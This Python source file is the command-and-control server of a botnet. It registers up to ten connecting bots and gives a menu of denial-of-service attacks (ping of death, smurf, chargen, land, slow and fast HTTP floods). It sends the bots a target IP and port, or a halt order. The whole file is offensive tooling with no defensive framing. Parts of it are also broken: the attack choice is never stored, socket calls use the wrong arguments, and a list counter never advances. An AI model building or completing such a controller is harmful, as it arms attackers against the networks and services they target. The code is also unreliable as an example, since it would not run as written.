import threading
import socket
import os
import time
from io import StringIO
from typing import List

class Netbot:
    def __init__(self, id, is_start, address):
        self.id = id
        self.is_start = is_start
        self.address = address

class Server:
    def __init__(self, socketfd):
        # self.socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socketfd = socketfd

        self.attacking = False
        self.attack = "None"

        self.target_ip = "None"
        self.target_port = 0

        self.netbots = []
        self.threads = []
        self.tListener = threading.Thread()

    def server_status(self):
        if self.target_ip == "None" and self.attack == "None" and self.attacking == False:
            return "\nServer started, waiting for client connections...\n"
        elif self.attack == "HALT" and self.target_ip != "None":
            return "\nAttack halted. Waiting for commands.\n"
        elif self.attacking == True and self.attack == "None":
            self.attacking = False
            return "\nPlease, enter attack type.\n"
        elif self.attacking == True and self.target_ip == "None":
            self.attacking = False
            return "\nPlease, enter target parameters.\n"
        elif self.attacking == True:
            return "\nServer attacking (" + self.attack + ") target: " + self.target_ip + "\n"  
        else:
            return "\nServer started, waiting for client connections...\n"
            
    def setup_target_parameters(self):
        self.target_ip = input("Enter target IP address: ")
        self.target_port = input("Enter target port: ")
        
    def start_attack(self):
        if(self.attack != "None" and self.target_ip != "None" and self.target_port != 0):
            for netbot in self.netbots:
                if self.attack == "HALT":
                    message = self.attack
                else:
                    message = f"{self.attack}_{self.target_ip}_{self.target_port}"

                self.socketfd.send(netbot.id, message.encode(), len(message),0)

    def close_connected_sockets(self):
        for netbot in self.netbots:
            self.socketfd.close(netbot.id)
    
    def list_bots(self):
        os.system("clear")
        print(f"\n\nBots connected ({len(self.netbots)}):\n")

        i = 0
        for bot in self.netbots:
            print(f"bot {i}: {bot.address[0]} : {bot.address[1]}")
        
        print("\nPress any key to exit...")

        input()
        
    def setup_attack_type(self):
        attack = ""
        int_choice = 0
        while True:
            os.system("clear")
            print("\n")
            print("Attack options: \n")
            print("1. Ping of death attack")
            print("2. Smurf attack")
            print("3. Chargen attack")
            print("4. Land attack")
            print("5. Slow HTTP attack")
            print("6. Fast HTTP attack")
            print("7. Exit")

            char_choice = input("Enter your choice: ")
            
            # 转换输入为整数
            try:
                int_choice = int(char_choice)
            except ValueError:
                print("Invalid input. Please enter a valid number.")
                continue

            if int_choice == 1:
                attack = "POD"
            elif int_choice == 2:
                attack = "SMURF"
            elif int_choice == 3:
                attack = "CHARGEN"
            elif int_choice == 4:
                attack = "LAND"
            elif int_choice == 5:
                attack = "SLOWHTTP"
            elif int_choice == 6:
                attack = "FASTHTTP"
            elif int_choice == 7:
                break
            else:
                print("Wrong choice. Enter option again.")
                continue

            # 如果选择正确，退出循环
            if int_choice in [1, 2, 3, 4, 5, 6]:
                break
        
    def threaded(self, i):
        buffer = bytearray(1024)
        try:
            while True:
                bytes_received = i.recv_into(buffer) # 接收数据
                if bytes_received == 0: # 客户端断开连接
                    # 查找并删除netbot
                    bot = None
                    for netbot in self.netbots:
                        if netbot.id == i:
                            bot = netbot
                            self.netbots.remove(netbot)
                            netbot -= 1

                    print(f"\nNetbot ({bot.address[0]} : {bot.address[1]}) disconnected.", flush=True)

                    i.close()

                    time.sleep(3)
                    print("\033[2K\r", end="", flush=True) # 清除当前行
                    print("\x1b[A", end="", flush=True) # 移动光标到上一行
                    return
        except Exception as e:
            print(f"Error: {e}", flush=True)
            i.close()
    
    def connection_listener(self, i):
        while len(self.netbots) != 10:
            client_socket, client_address = self.socketfd.accept()
            print(f"Client connected: {client_address[0]} : {client_address[1]}\tTotal Bots Connected: {len(self.netbots)}")

            # 将客户端信息添加到netbots列表
            netbot = Netbot(id = client_socket, is_start = False, address = client_address)
            self.netbots.append(netbot)

            # 创建并启动
            thread = threading.Thread(target=self.threaded, args=(client_socket,))
            thread.daemon = True # 设置为守护线程
            self.threads.append(thread)
            thread.start()    
    
